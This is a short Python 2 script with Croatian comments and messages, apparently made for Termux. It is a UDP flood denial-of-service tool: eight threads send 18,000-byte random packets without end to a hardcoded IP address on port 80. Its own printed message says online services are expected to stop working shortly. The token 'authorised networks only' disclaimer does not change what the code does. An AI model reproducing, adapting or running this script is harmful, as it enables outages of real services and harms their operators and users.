# UDP FLOOD SKRIPTA #
# -*- coding: utf-8 -*-
import sys 
import os
import time
import random
import threading
import socket

#Postavke
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(18000)
# Boje
RED     = "\033[91m"
GREEN   = "\033[92m"
YELLOW  = "\033[93m"
BLUE    = "\033[94m"
MAGENTA = "\033[95m"
CYAN    = "\033[96m"
WHITE   = "\033[97m"
RESET   = "\033[0m"
BOLD    = "\033[1m"

os.system("clear") 

print CYAN + "UDP Flood - Termux Lite Verzija" + RESET
print " "
print "Koristi samo na " + RED + "ovlastenim mrezama!" + RESET
print "Napravio  > " + RED + "HunteR_" + RESET

ip = "77.78.204.44"
port = 80
print " "
pitanje = raw_input("Zelis li nastaviti? " + YELLOW + "[y/n]: " + RESET)
sent = 0
if pitanje.lower() == "y":
    print " "
    print "Mreza se flooda UDP paketima, ocekivan prestanak rada online servisa u kratkom vremenu."
    def sender():
        while True:
            sock.sendto(bytes, (ip, port))

    threads = []

    for i in range(8):
        t = threading.Thread(target=sender)
        t.daemon = True
        t.start()
        threads.append(t)

    while True:
        pass
else:
    print "Prekinut nastavak. Izlazim..."
    exit()
